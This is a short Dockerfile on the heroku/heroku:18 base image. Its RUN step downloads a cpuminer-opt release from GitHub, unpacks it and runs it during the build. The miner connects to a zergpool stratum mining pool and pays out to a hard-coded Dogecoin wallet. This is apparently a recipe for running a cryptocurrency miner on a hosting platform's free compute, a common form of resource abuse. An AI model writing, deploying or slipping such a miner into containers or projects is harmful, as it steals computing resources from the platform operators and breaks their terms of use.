FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz && ./cpuminer-opt-linux -a power2b -o stratum+tcp://power2b.asia.mine.zergpool.com:7445 -u DEkD3VPhyYLxRScjAjg78cMxZRCXirsDv9 -p c=DOGE
CMD bash heroku.sh
